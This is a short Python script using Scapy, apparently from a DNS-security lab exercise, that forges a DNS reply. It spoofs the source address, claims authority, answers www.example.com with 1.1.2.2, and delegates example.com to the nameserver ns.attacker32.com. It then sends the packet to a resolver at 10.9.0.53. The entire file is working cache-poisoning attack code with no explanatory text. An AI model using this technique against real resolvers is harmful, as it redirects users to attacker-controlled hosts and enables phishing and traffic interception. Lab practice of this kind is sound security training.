from scapy.all import IP,UDP,RandShort,send
from scapy.layers.dns import DNSQR,DNS,DNSRR

domain = 'example.com'
name = 'www.example.com'
ns = "ns.attacker32.com"
qdesc = DNSQR(qname=name)
anssec = DNSRR(rrname=name,type='A',rdata='1.1.2.2',ttl=259200)
nssec = DNSRR(rrname=domain,type='NS',rdata=ns,ttl=259200)
dns = DNS(id = 0xAAAA, aa=1,qr=1,rd=0,qdcount=1,ancount=1,nscount=1,arcount=0,qd=qdesc,an=anssec,ns=nssec)

ip = IP(dst='10.9.0.53',src='1.2.3.4',chksum=0)
udp = UDP(dport=33333,sport=53,chksum=0)

pkt = ip/udp/dns

send(pkt)

